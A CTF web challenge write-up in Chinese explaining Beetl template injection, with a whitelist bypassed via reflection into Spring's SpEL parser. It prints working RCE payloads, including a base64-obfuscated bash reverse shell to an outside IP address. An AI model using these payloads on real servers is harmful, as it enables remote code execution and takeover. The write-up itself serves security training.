- **题目名称：** EL
- **题目类型：** WEB
- **题目难度：** 中等
- **出题人：** Victor
- **考点：**

1. beetl模板注入
2. 信息搜集和阅读官方文档
3. 通过反射构造调用表达式语言

- **描述：** 这次好像又要用到反射
- **flag：** XSCTF{Expr3ssi0n_L4ngu4g3_is_v3ry_u5efu1}
- **Writeup：** 

反编译jar包后可以看到程序的逻辑就是在/render路由下进行beetl模板的渲染且渲染内容可控，显然是要打SSTI。通过搜集信息和对官方文档的简单阅读可知beetl模板通过@xxx即可调用java静态方法；在3.17.0版本后作者对可调用的类默认从黑名单改成了白名单；题目中的MySecurityManager即为出题人对白名单的修改，可以看到相比默认的白名单多了java.lang.Class和org.springframework。再根据题目提示反射和一些旧版本下beetl模板注入的payload可以联想到经典的通过反射获取类进行实例化再调用scriptengine的js引擎执行命令：

`${@Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('calc');")}`

而本题中scriptengine不在白名单内，可以通过在白名单下的spel去执行命令

`${@Class.forName('org.springframework.expression.spel.standard.SpelExpressionParser').newInstance().parseRaw('T(java.lang.Runtime).getRuntime().exec("calc")').getValue()}`

打反弹shell在解析时由于引号和嵌套等问题，需要分成多行去写

```
<%
var spel = 'T(java.lang.Runtime).getRuntime().exec(\'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC4xNzkuNDkvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}\')';
var clazz = @Class.forName('org.springframework.expression.spel.standard.SpelExpressionParser').newInstance();
@clazz.parseRaw(spel).getValue();
%>
```

PS：在可以使用Class.forName()却不能使用method.invoke()时，十分常见的一种思路是通过newInstance()去调用危险方法；jdk8最常用的scriptengine在jdk11开始废弃，而spel表达式集成在spring依赖中，因此spel的适用性也很广。这道题本来想设置的自由一些的，但一直达不到想要的效果，遂开摆。